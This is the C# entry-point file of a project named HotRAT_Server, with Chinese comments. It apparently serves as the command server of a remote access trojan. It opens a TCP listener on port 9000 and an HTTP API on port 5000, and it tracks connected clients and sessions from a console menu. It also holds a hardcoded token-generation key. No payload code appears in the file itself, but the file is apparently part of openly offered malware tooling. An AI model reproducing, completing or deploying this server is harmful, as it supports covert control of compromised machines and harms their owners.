using HotRAT_Server.ApiServer;
using HotRAT_Server.Models;

namespace HotRAT_Server
{
    public class Program
    {
        //可以自己更改key值，这是客户端连接时生成临时Token必备的key
        public static string key = "2077576874888";
        public static Server server = new Server();

        static void Main(string[] args)
        {
            //启动Sokcet
            if (server.Start("0.0.0.0", 9000))
            {
                //启动HTTP API
                Task.Run(() => CreateHostBuilder(args).Build().Run());

                Console.WriteLine($"服务器运行中....\nToken：{AuthModel.Token()}\ntcp://0.0.0.0:9000");

                while (true)
                {
                    Console.WriteLine("指令: [clients] 展示所有客户端，[sess] 展示所有会话, [exit] 退出");
                    string command = Console.ReadLine().ToLower();

                    if (command == "clients")
                        Console.WriteLine(server.GetAllClientsAsJson());
                    
                    else if (command == "sess")
                        Console.WriteLine(server.GetAllSessionAsJson());

                    else if (command == "token")
                        Console.WriteLine(AuthModel.Token());

                    else if (command == "exit")
                        break;
                    
                }
            }
            else
            {
                Console.WriteLine("启动服务器失败");
            }

            server.Stop();
            Console.WriteLine("服务器停止.");
        }
        public static IHostBuilder CreateHostBuilder(string[] args) =>
            Host.CreateDefaultBuilder(args)
                .ConfigureWebHostDefaults(webBuilder =>
                {
                    webBuilder.UseStartup<ApiStartup>();
                    webBuilder.UseUrls("http://*:5000"); // 设置 API 监听地址
                });
    }
}
